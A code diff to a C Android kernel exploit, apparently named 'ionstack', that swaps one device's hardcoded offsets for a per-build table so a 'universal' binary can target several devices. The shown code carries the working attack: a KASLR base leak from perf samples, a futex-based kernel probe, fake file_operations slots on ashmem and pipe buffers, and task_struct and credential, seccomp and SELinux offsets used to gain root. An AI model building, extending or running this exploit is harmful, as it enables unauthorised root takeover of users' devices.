@@ -40,9 +40,12 @@ static char ashmem_path[256] = "/dev/ashmem";
 static unsigned long long kaslr_base;
 static unsigned long long kaslr_slide;
 static int kaslr_done;
-static unsigned long long g_ionstack_dev;      
+static const struct hz_table *g_hz;
+static const struct hz_dev *g_dev;
 static unsigned long long futex_hashsize = -1; 
 static unsigned long long *ks;                 
+
+#define HZ_COUNT ((unsigned long long)(sizeof(hz_tables) / sizeof(hz_tables[0])))
 
 
 static unsigned long long page_base, fake_lock, fake_w0, fake_task,
@@ -80,14 +83,14 @@ static int is_kernel_ptr(unsigned long long x) { return x > 0xFFFF7FFFFFFFFFFFul
 static int is_direct_ptr(unsigned long long x) { return (x >> 38) == 0x3FFFFFEull; }
 
 static unsigned long long data_addr(unsigned long long x) {
-    return (x + 0x401FFF0000ull) | 0xFFFFFF8000000000ull;
+    return (x + g_dev->data_add) | g_dev->data_or;
 }
 static unsigned long long text_addr(unsigned long long x) {
-    if (kaslr_done) x += 0x3FF8000000ull + kaslr_base;
+    if (kaslr_done) x += g_dev->text_add + kaslr_base;
     return x;
 }
 static unsigned long long p0_data_alias(unsigned long long x) {
-    return (x + 0x401FFF0000ull) | 0xFFFFFF8000000000ull;
+    return data_addr(x);
 }
 
 static int ionstack_stage_is(const char *s2) {
@@ -377,7 +380,7 @@ static unsigned long long *kernelsnitch_setup(unsigned long long mm_size,
     s[10] = (unsigned long long)futexes;
 
     e = getenv("IONSTACK_KS_ID_START");
-    unsigned long long id_start = 0xFFFFFF8000000000ull;
+    unsigned long long id_start = g_dev->ks_id_start;
     if (e && *e) {
         char *end = NULL; errno = 0;
         unsigned long long v = strtoull(e, &end, 0);
@@ -386,7 +389,7 @@ static unsigned long long *kernelsnitch_setup(unsigned long long mm_size,
     s[936] = id_start;
 
     e = getenv("IONSTACK_KS_ID_END");
-    unsigned long long id_end = 0xFFFFFFC000000000ull;
+    unsigned long long id_end = g_dev->ks_id_end;
     if (e && *e) {
         char *end = NULL; errno = 0;
         unsigned long long v = strtoull(e, &end, 0);
@@ -1189,32 +1192,46 @@ static unsigned long long slide_perf_leak_kernel_base(void) {
         puts("\x1B[31m[-] \x1B[0mslide perf no samples collected");
         return 0;
     }
-    unsigned long long best_base = 0, best_votes = 0, best_skid = 0, lowest_ip = 0;
+    unsigned long long best_base = 0, best_votes = 0, best_skid = 0, lowest_ip = 0, best_slide = 0;
     int valid_candidate = 0;
     for (unsigned long long i = 0; i < distinct; i++) {
         unsigned long long ip = ips[i];
-        if (ip < 0xFFFFFFC008000000ull || (ip + 0xFF8000000ull) < 0xFFFFFFE000000000ull) {
+        if (ip < g_dev->perf_min_ip) {
             printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx rejected (alignment or slide range)\n", i, ip);
             continue;
         }
-        unsigned long long base = ip & 0xFFFFFFFFFFE00000ull;
+        unsigned long long base_m = (ip - g_dev->perf_base_off) & 0xFFFFFFFFFFE00000ull;
+        unsigned long long base = base_m | g_dev->perf_base_off;
+        if (base < g_dev->perf_lo) {
+            printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx rejected (alignment or slide range)\n", i, ip);
+            continue;
+        }
+        if ((ip + g_dev->perf_hi_add) < 0xFFFFFFE000000000ull) {
+            printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx rejected (alignment or slide range)\n", i, ip);
+            continue;
+        }
+        if (g_dev->perf_skid_check && ((ip - base) >> 21)) {
+            printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx rejected (alignment or slide range)\n", i, ip);
+            continue;
+        }
         unsigned long long votes = 0;
         for (unsigned long long k = 0; k < distinct; k++) {
             if (ips[k] >= base && ips[k] - base < 0x200000) votes++;
         }
         printf("\x1B[33m[*] \x1B[0mslide perf candidate[%zu] ip=%016llx base=%016llx slide=%016llx skid=%016llx votes=%zu/%zu\n",
-               i, ip, base, base + 0x3FF8000000ull, ip & 0x1FFFFF, votes, distinct);
+               i, ip, base, base_m + g_dev->perf_slide_add, ip - base, votes, distinct);
         if (votes > best_votes) {
             best_base = base;
             best_votes = votes;
-            best_skid = ip & 0x1FFFFF;
+            best_skid = ip - base;
+            best_slide = base_m + g_dev->perf_slide_add;
             lowest_ip = ip;
         }
         valid_candidate = 1;
     }
     if (best_votes > 1) {
         printf("\x1B[32m[+] \x1B[0mslide-perf-candidate ok=1 min_ip=%016llx candidate_base=%016llx slide=%016llx skid=%016llx votes=%zu/%zu samples=%zu\n",
-               lowest_ip, best_base, best_base + 0x3FF8000000ull, best_skid, best_votes, distinct, samples);
+               lowest_ip, best_base, best_slide, best_skid, best_votes, distinct, samples);
         return best_base;
     }
     printf("\x1B[31m[-] \x1B[0mslide perf no base won the vote (lowest ip=%016llx distinct_low=%zu samples=%zu valid_candidate=%d best_votes=%zu/%d) -- valid_candidate=1 means the low IPs disagreed, not that perf sampling failed\n",
@@ -1226,7 +1243,7 @@ static int slide_perf_leak_kernel_base_route(void) {
     unsigned long long v = slide_perf_leak_kernel_base();
     if (!v) return 0;
     kaslr_base = v;
-    kaslr_slide = v + 0x3FF8000000ull;
+    kaslr_slide = v + g_dev->slide_add;
     kaslr_done = 1;
     printf("\x1B[32m[+] \x1B[0mslide-kaslr-ok source=perf pid=%d base=%016llx slide=%016llx\n",
            getpid(), kaslr_base, kaslr_slide);
@@ -1240,7 +1257,7 @@ static int slide_leak_kernel_base(void) {
     unsigned long long v = slide_perf_leak_kernel_base();
     if (!v) return 0;
     kaslr_base = v;
-    kaslr_slide = v + 0x3FF8000000ull;
+    kaslr_slide = v + g_dev->slide_add;
     kaslr_done = 1;
     printf("\x1B[32m[+] \x1B[0mslide-kaslr-ok source=perf pid=%d base=%016llx slide=%016llx\n",
            getpid(), kaslr_base, kaslr_slide);
@@ -1313,7 +1330,7 @@ static int log_startup_context(void) {
     printf("\x1B[32m[+] \x1B[0mstartup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
            getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
     printf("\x1B[32m[+] \x1B[0mstartup limits pid=%d %s\n", getpid(), s);
-    printf("\x1B[32m[+] \x1B[0mbuild config pid=%d label=%s slide=pselect main=pselect\n", getpid(), "quest3_eureka");
+    printf("\x1B[32m[+] \x1B[0mbuild config pid=%d label=%s slide=pselect main=pselect\n", getpid(), g_dev->label);
     unsigned long long envc = 0;
     if (environ) {
         for (char **e = environ; *e; e++)
@@ -1324,29 +1341,33 @@ static int log_startup_context(void) {
     }
     printf("\x1B[32m[+] \x1B[0mstartup env count=%zu (only IONSTACK_* shown; absent means the built-in default applied)\n", envc);
     return printf("\x1B[32m[+] \x1B[0mp0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx delta=%016llx\n",
-                  getpid(), 0x80000000ull, 2818506752ull, 671023104ull);
+                  getpid(), g_dev->phys, g_dev->load, g_dev->delta);
 }
 
 static int check_device_table(void) {
     struct utsname name;
     int uname_rc = uname(&name);
-    const char *release = *(const char **)g_ionstack_dev;
-    const char *incremental = *(const char **)(g_ionstack_dev + 8);
+    const char *release = g_hz->release;
+    const char *incremental = g_hz->incremental;
     int allow = 0;
     if (!uname_rc && !strcmp(name.release, release)) {
+        if (!incremental[0]) {
+            printf("\x1B[32m[+] \x1B[0mdevice-table %s match=1 release=%s\n", g_dev->label, name.release);
+            return 1;
+        }
         char inc[92];
         memset(inc, 0, sizeof(inc));
         int n = __system_property_get("ro.build.version.incremental", inc);
         if (n <= 0) {
             printf("\x1B[31m[-] \x1B[0mdevice-table %s incremental=UNREADABLE (table pins %s) -- the release string alone does not identify this build\n",
-                   "quest3_eureka", incremental);
+                   g_dev->label, incremental);
         } else if (!strcmp(inc, incremental)) {
-            printf("\x1B[32m[+] \x1B[0mdevice-table %s incremental match=1 %s\n", "quest3_eureka", inc);
-            printf("\x1B[32m[+] \x1B[0mdevice-table %s match=1 release=%s\n", "quest3_eureka", name.release);
+            printf("\x1B[32m[+] \x1B[0mdevice-table %s incremental match=1 %s\n", g_dev->label, inc);
+            printf("\x1B[32m[+] \x1B[0mdevice-table %s match=1 release=%s\n", g_dev->label, name.release);
             return 1;
         } else {
             printf("\x1B[31m[-] \x1B[0mdevice-table %s release matches but incremental does NOT: running=%s table=%s. On this device several incrementals share one kernel release and their DATA symbols differ; OFFSETS ARE FOR A DIFFERENT BUILD\n",
-                   "quest3_eureka", inc, incremental);
+                   g_dev->label, inc, incremental);
         }
     }
     char *e = getenv("IONSTACK_ALLOW_TABLE_MISMATCH");
@@ -1364,14 +1385,14 @@ static int check_device_table(void) {
     }
     if (uname_rc) {
         printf("\x1B[31m[-] \x1B[0mdevice-table %s match=? uname failed errno=%d -- cannot verify the table against the running kernel%s\n",
-               "quest3_eureka", errno, allow ? ", proceeding (override)" : "");
+               g_dev->label, errno, allow ? ", proceeding (override)" : "");
         if (allow) return allow;
     } else {
         printf("\x1B[31m[-] \x1B[0mdevice-table %s match=0 running=%s table=%s -- OFFSETS ARE FOR A DIFFERENT BUILD%s\n",
-               "quest3_eureka", name.release, release, allow ? ", proceeding (override)" : "");
+               g_dev->label, name.release, release, allow ? ", proceeding (override)" : "");
     }
     printf("\x1B[31m[-] \x1B[0mdevice-table %s REFUSING to run: wrong offsets panic or wedge the device rather than failing cleanly. Re-derive the table, or set IONSTACK_ALLOW_TABLE_MISMATCH=1 to override.\n",
-           "quest3_eureka");
+           g_dev->label);
     fflush(stdout);
     fsync(1);
     return allow;
@@ -1379,34 +1400,42 @@ static int check_device_table(void) {
 
 static int ionstack_universal_select(void) {
     struct utsname name;
+    char devprop[128] = "";
+    __system_property_get("ro.product.device", devprop);
     if (uname(&name)) {
         printf("\x1B[31m[-] \x1B[0muniversal: uname() failed errno=%d : cannot identify the running build, REFUSING to avoid crash\n", errno);
     } else {
         char inc[92];
         memset(inc, 0, sizeof(inc));
-        if (__system_property_get("ro.build.version.incremental", inc) <= 0) {
+        int have_inc = __system_property_get("ro.build.version.incremental", inc) > 0;
+        if (!have_inc) {
             printf("\x1B[31m[-] \x1B[0muniversal: ro.build.version.incremental UNREADABLE -- this device (%s, release=%s) keys on incremental, and the release alone does not identify the build. REFUSING.\n",
-                   "quest3_eureka", name.release);
+                   "universal", name.release);
         } else {
             unsigned long long i = 0;
-            for (; i < 92; i++) {
-                if (!ionstack_universal_tables[i][1] ||
-                    !strcmp((const char *)ionstack_universal_tables[i][1], inc))
-                    break;
+            for (; i < HZ_COUNT; i++) {
+                const struct hz_table *t = &hz_tables[i];
+                if (strcmp(t->release, name.release)) continue;
+                if (t->incremental[0]) {
+                    if (strcmp(t->incremental, inc)) continue;
+                } else if (t->dev->code[0] && devprop[0] && !strstr(devprop, t->dev->code)) {
+                    continue;
+                }
+                break;
             }
-            if (i < 92) {
-                g_ionstack_dev = (unsigned long long)&ionstack_universal_tables[i];
+            if (i < HZ_COUNT) {
+                g_hz = &hz_tables[i];
+                g_dev = g_hz->dev;
                 printf("\x1B[32m[+] \x1B[0muniversal: selected table %d/%zu %s incremental=%s release=%s\n",
-                       (int)i, 92u, "quest3_eureka",
-                       (const char *)ionstack_universal_tables[i][1],
-                       (const char *)ionstack_universal_tables[i][0]);
+                       (int)i, HZ_COUNT, g_dev->label, g_hz->incremental, g_hz->release);
                 return 0;
             }
             printf("\x1B[31m[-] \x1B[0muniversal: no offset table for %s=%s among %zu tables (%s) -- REFUSING to run: wrong offsets panic or wedge the device rather than failing cleanly. Derive the overlay for this build and rebuild the universal binary.\n",
-                   "incremental", inc, 92u, "quest3_eureka");
+                   "release", name.release, HZ_COUNT, "universal");
         }
     }
-    g_ionstack_dev = 0;
+    g_hz = 0;
+    g_dev = 0;
     return 1;
 }
 
@@ -1526,31 +1555,38 @@ int main(int argc, char **argv) {
     if (dry) {
         printf("\x1B[32m[+] \x1B[0mdry ashmem path=%s\n", ashmem_path);
         printf("\x1B[32m[+] \x1B[0mdry offsets label=%s kimage=%016llx p0=%016llx phys=%llx load=%llx delta=%llx\n",
-               "quest3_eureka", 0xFFFFFFC008000000ull, 0xFFFFFF8000000000ull,
-               0x80000000ull, 2818506752ull, 671023104ull);
-        unsigned long long K = 0xFFFFFFC008000000ull;
-        unsigned long long slot = data_addr(*(unsigned long long *)(g_ionstack_dev + 88) + K);
-        unsigned long long fops_d = data_addr(*(unsigned long long *)(g_ionstack_dev + 16) + K);
-        unsigned long long fops_t = text_addr(*(unsigned long long *)(g_ionstack_dev + 16) + K);
-        unsigned long long kc = data_addr(*(unsigned long long *)(g_ionstack_dev + 176) + K);
-        unsigned long long apbo = data_addr(*(unsigned long long *)(g_ionstack_dev + 184) + K);
+               g_dev->label, g_dev->kimage, g_dev->p0,
+               g_dev->phys, g_dev->load, g_dev->delta);
+        unsigned long long A = g_dev->alias_addend;
+        unsigned long long slot = data_addr(g_hz->off[11] + A);
+        unsigned long long fops_d = data_addr(g_hz->off[2] + A);
+        unsigned long long fops_t = text_addr(g_hz->off[2] + A);
+        unsigned long long kc = data_addr(g_hz->off[22] + A);
+        unsigned long long apbo = data_addr(g_hz->off[23] + A);
         printf("\x1B[32m[+] \x1B[0mdry aliases ashmem_misc_fops_slot=%016llx ashmem_fops_data=%016llx ashmem_fops_text=%016llx kmalloc_caches=%016llx anon_pipe_buf_ops=%016llx\n",
                slot, fops_d, fops_t, kc, apbo);
         unsigned long long v[8];
         for (int i = 0; i < 8; i++)
-            v[i] = text_addr(*(unsigned long long *)(g_ionstack_dev + 24 + 8 * i) + K);
+            v[i] = text_addr(g_hz->off[3 + i] + A);
         printf("\x1B[32m[+] \x1B[0mdry text ashmem llseek=%016llx read_iter=%016llx ioctl=%016llx compat_ioctl=%016llx mmap=%016llx open=%016llx release=%016llx show_fdinfo=%016llx\n",
                v[0], v[1], v[2], v[3], v[4], v[5], v[6], v[7]);
-        unsigned long long fr = text_addr(*(unsigned long long *)(g_ionstack_dev + 240) + K);
-        unsigned long long fw = text_addr(*(unsigned long long *)(g_ionstack_dev + 248) + K);
-        unsigned long long fs = text_addr(*(unsigned long long *)(g_ionstack_dev + 264) + K);
-        unsigned long long fl = text_addr(*(unsigned long long *)(g_ionstack_dev + 272) + K);
+        unsigned long long fr = text_addr(g_hz->off[g_dev->ff_read] + A);
+        unsigned long long fw = text_addr(g_hz->off[g_dev->ff_write] + A);
+        unsigned long long fs = text_addr(g_hz->off[g_dev->ff_splice] + A);
+        unsigned long long fl = text_addr(g_hz->off[g_dev->ff_llseek] + A);
         printf("\x1B[32m[+] \x1B[0mdry fake_fops_slots read@%x=%016llx write@%x=%016llx read_iter@%x=0 write_iter@%x=0 splice_read@%x=%016llx llseek_repair=%016llx\n",
                16, fr, 24, fw, 32, 40, 200, fs, fl);
         printf("\x1B[32m[+] \x1B[0mdry task_offsets tasks=%x pid=%x tgid=%x atomic_flags=%x cred=%x real_cred=%x comm=%x seccomp=%x pi_lock=%x pi_blocked_on=%x\n",
-               1216, 1472, 1476, 1416, 1912, 1904, 1928, 2096, 2132, 2176);
+               (unsigned int)g_dev->task_off[0], (unsigned int)g_dev->task_off[1],
+               (unsigned int)g_dev->task_off[2], (unsigned int)g_dev->task_off[3],
+               (unsigned int)g_dev->task_off[4], (unsigned int)g_dev->task_off[5],
+               (unsigned int)g_dev->task_off[6], (unsigned int)g_dev->task_off[7],
+               (unsigned int)g_dev->task_off[8], (unsigned int)g_dev->task_off[9]);
         printf("\x1B[32m[+] \x1B[0mdry cred_seccomp_offsets uid=%x securebits=%x caps=%x security=%x seccomp_mode=%x seccomp_filter=%x have_count=%d selinux_blob_sizes=%d blob_off=%x\n",
-               4, 36, 40, 120, 0, 8, 1, 0, 0);
+               (unsigned int)g_dev->cred_off[0], (unsigned int)g_dev->cred_off[1],
+               (unsigned int)g_dev->cred_off[2], (unsigned int)g_dev->cred_off[3],
+               (unsigned int)g_dev->cred_off[4], (unsigned int)g_dev->cred_off[5],
+               (int)g_dev->cred_off[6], (int)g_dev->cred_off[7], (unsigned int)g_dev->cred_off[8]);
         return 0;
     }
 
@@ -1564,15 +1600,15 @@ int main(int argc, char **argv) {
             printf("\x1B[31m[!] \x1B[0minvalid IONSTACK_KASLR_BASE=%s\n", e);
             exit(-1);
         }
-        unsigned long long slide = 0xFFFFFFC008000000ull - v;
-        if (v >= 0xFFFFFFC008000000ull) slide = v + 0x3FF8000000ull;
+        unsigned long long slide = g_dev->kimage - v;
+        if (v >= g_dev->kimage) slide = v + g_dev->slide_add;
         if (slide >> 39) {
             printf("\x1B[31m[!] \x1B[0mIONSTACK_KASLR_BASE slide invalid base=%016zx slide=%016zx (expected 4K alignment and 39-bit range)\n",
-                   v, v + 0x3FF8000000ull);
+                   v, v + g_dev->slide_add);
             exit(-1);
         }
         kaslr_base = v;
-        kaslr_slide = v + 0x3FF8000000ull;
+        kaslr_slide = v + g_dev->slide_add;
         kaslr_done = 1;
         printf("\x1B[32m[+] \x1B[0mkaslr-external-ok pid=%d base=%016llx slide=%016llx source=IONSTACK_KASLR_BASE\n",
                getpid(), kaslr_base, kaslr_slide);
